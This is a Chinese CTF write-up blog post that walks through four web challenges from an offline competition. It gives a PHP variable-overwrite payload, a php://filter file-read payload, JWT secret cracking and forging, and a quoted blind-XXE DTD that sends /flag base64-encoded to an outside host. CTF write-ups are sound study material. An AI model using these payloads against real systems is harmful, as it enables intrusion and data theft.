@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  <title>川师线下CTF Writeup | Threezh1&#39;s blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="HPP,">
+  
+
+  <meta name="description" content="说在前面这次和队友一起去川师打了一次线下的CTF。虽然比赛中很多题都没做出来，但学到很多东西。赛后出题师傅也给出了源码和Writeup，抓住机会总结学习。 重新搭建题目的环境有点困难，所以还是有两题无法进行复现。  Web418打开网页后是一个418的错误页面。  Google了一下418错误 “ERR！418 我是茶壶”起源 “错误 418 我是茶壶”消息不是标准的服务器错误类型，这是 1998">
+<meta name="keywords" content="HPP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="川师线下CTF Writeup">
+<meta property="og:url" content="http://yoursite.com/2019/05/15/川师线下CTF-Web-Writeup/index.html">
+<meta property="og:site_name" content="Threezh1&#39;s blog">
+<meta property="og:description" content="说在前面这次和队友一起去川师打了一次线下的CTF。虽然比赛中很多题都没做出来，但学到很多东西。赛后出题师傅也给出了源码和Writeup，抓住机会总结学习。 重新搭建题目的环境有点困难，所以还是有两题无法进行复现。  Web418打开网页后是一个418的错误页面。  Google了一下418错误 “ERR！418 我是茶壶”起源 “错误 418 我是茶壶”消息不是标准的服务器错误类型，这是 1998">
+<meta property="og:locale" content="Chinese">
+<meta property="og:image" content="https://i.loli.net/2019/05/17/5cde2430300e851524.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24303bb8224199.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24303009952057.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/17/5cde2465d8f5995939.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24a10415b69935.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24a10052a43128.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24a11e9be38274.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24a0ec43273869.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/05/15/川师线下CTF-Web-Writeup/![web5_tpvip.jpg](https://i.loli.net/2019/05/17/5cde24dd697f768705.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24dd77fb099016.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/05/17/5cde24dd7c86615595.jpg">
+<meta property="og:updated_time" content="2019-05-17T03:05:54.801Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="川师线下CTF Writeup">
+<meta name="twitter:description" content="说在前面这次和队友一起去川师打了一次线下的CTF。虽然比赛中很多题都没做出来，但学到很多东西。赛后出题师傅也给出了源码和Writeup，抓住机会总结学习。 重新搭建题目的环境有点困难，所以还是有两题无法进行复现。  Web418打开网页后是一个418的错误页面。  Google了一下418错误 “ERR！418 我是茶壶”起源 “错误 418 我是茶壶”消息不是标准的服务器错误类型，这是 1998">
+<meta name="twitter:image" content="https://i.loli.net/2019/05/17/5cde2430300e851524.jpg">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbeddx" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'UA-38189205-1', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+</head>
+</html>
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/archives/" rel="noopener noreferrer" target="_self">
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/category/" rel="noopener noreferrer" target="_self">
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/tag/" rel="noopener noreferrer" target="_self">
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/link/" rel="noopener noreferrer" target="_self">
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/about/" rel="noopener noreferrer" target="_self">
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/atom.xml" rel="noopener noreferrer" target="_blank">
+            RSS
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a class="CIRCLE" href="/search/" rel="noopener noreferrer" target="_self">
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#说在前面"><span class="toc-text">说在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#418"><span class="toc-text">418</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#签到题"><span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP是世界上最好的语言"><span class="toc-text">PHP是世界上最好的语言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#龙湖论坛"><span class="toc-text">龙湖论坛</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后话"><span class="toc-text">后话</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-川师线下CTF-Web-Writeup" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">川师线下CTF Writeup</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2019.05.15</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>Threezh1</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h2 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h2><p>这次和队友一起去川师打了一次线下的CTF。虽然比赛中很多题都没做出来，但学到很多东西。赛后出题师傅也给出了源码和Writeup，抓住机会总结学习。</p>
+<p>重新搭建题目的环境有点困难，所以还是有两题无法进行复现。 </p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="418"><a href="#418" class="headerlink" title="418"></a>418</h3><p>打开网页后是一个418的错误页面。</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde2430300e851524.jpg" alt="pic"></p>
+<p>Google了一下418错误</p>
+<pre><code>“ERR！418 我是茶壶”起源
+“错误 418 我是茶壶”消息不是标准的服务器错误类型，这是 1998 年的一个愚人节恶作剧，距今已有 20 年了。许多开发团队在他们的应用程序中实施了“错误 418 我是茶壶”的消息作为内部笑话，通常使用这个错误来处理未知来源的错误。
+</code></pre><p>又在cookie处发现了一个base64加密的值： 解密后为：coffee</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde24303bb8224199.jpg" alt="pic"></p>
+<p>用Brupsuite抓包后修改了cookie的值，网页提示：</p>
+<pre><code>Tell me what you want ! 
+</code></pre><p>于是我修改为flag的加密值，没用。在修改很多次之后队友解出来了。竟然是tea的base64。</p>
+<p>修改cookie后访问得到flag，这题，真的有点考脑洞。</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde24303009952057.jpg" alt="pic"></p>
+<h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>是一道简单的代码审计题。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_GET[<span class="string">'data'</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $data = json_decode($_GET[<span class="string">'data'</span>], <span class="keyword">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        $data = [];</span><br><span class="line">    &#125;</span><br><span class="line">    extract($data);</span><br><span class="line">    <span class="keyword">if</span>($users[$username]) &#123;		</span><br><span class="line">        $user = $username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($user==$usname) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"sicnuctf&#123;************&#125;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>参数data在经过json_decode之后进行了变量覆盖。</p>
+<p>构造payload：</p>
+<p>data = {“usname”:”123”, “users”:{“username”:”123”}, “user”:”123”}</p>
+<p>得到Flag</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde2465d8f5995939.jpg" alt="pic"></p>
+<h3 id="PHP是世界上最好的语言"><a href="#PHP是世界上最好的语言" class="headerlink" title="PHP是世界上最好的语言"></a>PHP是世界上最好的语言</h3><p>用御剑，可以直接跑出登录，注册的源码地址，注册一个账号，登录进去可以拿到member.php的源码。</p>
+<p>register.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=***'</span>, <span class="string">'***'</span>, <span class="string">'***'</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">&#125;					<span class="comment">//str_shuffle()随机地打乱字符串中的所有字符</span></span><br><span class="line">$admin = <span class="string">"sicnu"</span>.<span class="string">"#"</span>.str_shuffle(<span class="string">'hello_here_is_your_flag_but_it_no_easy'</span>);</span><br><span class="line">$username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</span><br><span class="line">$password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</span><br><span class="line">$code = (<span class="keyword">isset</span>($_POST[<span class="string">'code'</span>]) === <span class="keyword">true</span>) ? (string)$_POST[<span class="string">'code'</span>] : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($username) &gt; <span class="number">16</span> || strlen($username) &gt; <span class="number">16</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'is too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'SELECT username FROM users WHERE username = :username'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line"><span class="keyword">if</span> ($sth-&gt;fetch() !== <span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'username has been registered'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO users (username, password) VALUES (:username, :password)'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':password'</span> =&gt; $password]);</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/^(sicnu)((?:#|\w)+)$/i'</span>, $code, $matches);</span><br><span class="line"><span class="keyword">if</span> (count($matches) === <span class="number">3</span> &amp;&amp; $admin === $matches[<span class="number">0</span>]) &#123;</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO inspect (username, permit) VALUES (:username, :permit)'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':permit'</span> =&gt; $matches[<span class="number">1</span>]]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO inspect (username, permit) VALUES (:username, "TERRIBLE")'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("register success");location.href="log.html"&lt;/script&gt;'</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Log.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=***'</span>, <span class="string">'***'</span>, <span class="string">'***'</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$username = (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'username'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'username'</span>] : <span class="keyword">die</span>(<span class="string">'Missing username'</span>);</span><br><span class="line">$password = (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]) === <span class="keyword">true</span> &amp;&amp; $_POST[<span class="string">'password'</span>] !== <span class="string">''</span>) ? (string)$_POST[<span class="string">'password'</span>] : <span class="keyword">die</span>(<span class="string">'Missing password'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strlen($username) &gt; <span class="number">32</span> || strlen($password) &gt; <span class="number">32</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'is too long'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'SELECT password FROM users WHERE username = :username'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line"><span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] !== $password) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Error in username or password'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">'username'</span>] = $username;</span><br><span class="line"><span class="keyword">unset</span>($_SESSION[<span class="string">'is_logined'</span>]);</span><br><span class="line"><span class="keyword">unset</span>($_SESSION[<span class="string">'is_guest'</span>]);</span><br><span class="line"><span class="comment">#echo $username;</span></span><br><span class="line">header(<span class="string">"Location: member.php"</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Member.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'username'</span>]) === <span class="keyword">false</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'please login first'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(<span class="string">'mysql:host=localhost;dbname=***'</span>, <span class="string">'***'</span>, <span class="string">'***'</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'mysql connected error'</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'SELECT permit FROM inspect WHERE username = :username'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $_SESSION[<span class="string">'username'</span>]]);</span><br><span class="line"><span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'TERRIBLE'</span>) &#123;</span><br><span class="line">$_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'is_logined'</span>] = <span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'is_logined'</span>]) === <span class="keyword">false</span> || <span class="keyword">isset</span>($_SESSION[<span class="string">'is_guest'</span>]) === <span class="keyword">true</span>) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"no no no!"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])===<span class="keyword">false</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"no"</span>;</span><br><span class="line"><span class="keyword">elseif</span>(is_file($_GET[<span class="string">'file'</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"you cannot give me a file"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">readfile($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>拿到Flag的关键在于要绕过一个is_guest判断。</p>
+<p>member.php源码处：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'SELECT permit FROM inspect WHERE username = :username'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $_SESSION[<span class="string">'username'</span>]]);</span><br><span class="line"><span class="keyword">if</span> ($sth-&gt;fetch()[<span class="number">0</span>] === <span class="string">'TERRIBLE'</span>) &#123;</span><br><span class="line">$_SESSION[<span class="string">'is_guest'</span>] = <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>而TERRIBLE是在注册时写入的，在register.php源码中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">preg_match(<span class="string">'/^(sicnu)((?:#|\w)+)$/i'</span>, $code, $matches);</span><br><span class="line"><span class="keyword">if</span> (count($matches) === <span class="number">3</span> &amp;&amp; $admin === $matches[<span class="number">0</span>]) &#123;</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO inspect (username, permit) VALUES (:username, :permit)'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username, <span class="string">':permit'</span> =&gt; $matches[<span class="number">1</span>]]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$sth = $pdo-&gt;prepare(<span class="string">'INSERT INTO inspect (username, permit) VALUES (:username, "TERRIBLE")'</span>);</span><br><span class="line">$sth-&gt;execute([<span class="string">':username'</span> =&gt; $username]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>先进行了一个正则匹配，再进行了if语句，其中一个条件为<code>$admin === $matches[0]</code></p>
+<p>根据前面的<code>$admin = &quot;sicnu&quot;.&quot;#&quot;.str_shuffle(&#39;hello_here_is_your_flag_but_it_no_easy&#39;);</code> 可知,admin的值为一个随机值，这里只能进行绕过。</p>
+<p>这里可以利用条件竞争绕过</p>
+<p>正则表达式的意义如图所示</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde24a10415b69935.jpg" alt="web4_zhengze.jpg"></p>
+<p>如果在#号后面赋值非常长的一段字符，在php匹配的时长会消耗资源（拖延时间）导<br>致后面的语句暂时无法执行。也就无法将permit字段设置为TERRIBLE。</p>
+<p>因为前面已经注册了账号，所以这里就可以绕过is_guest的判断。</p>
+<p>正常注册登录提示：no no no!</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde24a10052a43128.jpg" alt="web4_nonono.jpg"></p>
+<p>重新注册一个账号，code处赋值为长字符串：</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde24a11e9be38274.jpg" alt="web4_reg.jpg"></p>
+<p>重新登录,显示no，说明已经绕过is_guest</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde24a0ec43273869.jpg" alt="web4_no.jpg"></p>
+<p>最后还需要用PHP伪协议绕过is_file函数</p>
+<pre><code>payload：
+member.php?file=php://filter/read/convert.base64-encode/resource=config.php
+</code></pre><p>读config.php得到flag的base64，解码即可。</p>
+<h3 id="龙湖论坛"><a href="#龙湖论坛" class="headerlink" title="龙湖论坛"></a>龙湖论坛</h3><p>比赛的时候还没有接触过JWT，也没有时间做了，这里就相当于复现了。</p>
+<p>一个论坛，只有简单的注册，登录和一个留言功能。</p>
+<p>RSS订阅需要先成为VIP。</p>
+<p><img src="![web5_tpvip.jpg](https://i.loli.net/2019/05/17/5cde24dd697f768705.jpg" alt="pic">)</p>
+<p>登录之后，可以在cookie值里面看到token</p>
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzeXMiLCJ1c2VybmFtZSI6ImFkbWluIiwiaXN2aXAiOjAsImlhdCI6MTU1NzkyODE2NSwiZXhwIjoxNTU3OTMxNzY1LCJuYmYiOjE1NTc5MjgxNjUsImp0aSI6IjBlMjM5MTI4OWZmMmNmZTc0NjUxZjIyMDlkYzk5YmI1In0.WKRwWB3QE6CG3BYi3WGQ9EBIX3g_YCT26bJsaDMGsXo
+</code></pre><p>解密后的格式为：</p>
+<pre><code>{
+  &quot;alg&quot;: &quot;HS256&quot;,
+  &quot;typ&quot;: &quot;JWT&quot;
+}
+{
+  &quot;siss&quot;: &quot;sys&quot;,
+  &quot;username&quot;: &quot;admin&quot;,
+  &quot;isvip&quot;: 0,
+  &quot;iat&quot;: 1557928165,
+  &quot;exp&quot;: 1557931765,
+  &quot;nbf&quot;: 1557928165,
+  &quot;jti&quot;: &quot;0e2391289ff2cfe74651f2209dc99bb5&quot;
+}
+</code></pre><p>我们需要得到密钥，来修改isvip的值为1。</p>
+<p>这里可以使用工具：<a href="https://github.com/Sjord/jwtcrack" target="_blank" rel="noopener">https://github.com/Sjord/jwtcrack</a> 来爆破密钥。</p>
+<p>构造密钥后爆破得到密钥为sicnuctf</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde24dd77fb099016.jpg" alt="web5_rss.jpg"></p>
+<p>使用在线工具<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a> 修改JWT的值，然后修改cookie的token即可进入rss订阅页面。</p>
+<p><img src="https://i.loli.net/2019/05/17/5cde24dd7c86615595.jpg" alt="web5_findkey.jpg"></p>
+<p>看Writeup知道，这里是一个Blind XXE。</p>
+<p>由于环境配置，这里复现不了这个XXE，直接贴师傅的脚本了：</p>
+<p>payload.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE root SYSTEM "http://ip/evil.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;p;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>evil.dtd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY p SYSTEM &apos;http://ip:port/%p1;&apos;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure>
+<h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>接触到了两个新东西：</p>
+<ol>
+<li>php的条件竞争</li>
+<li>JWT</li>
+</ol>
+<p>后期还要更多的总结一下。</p>
+
+    
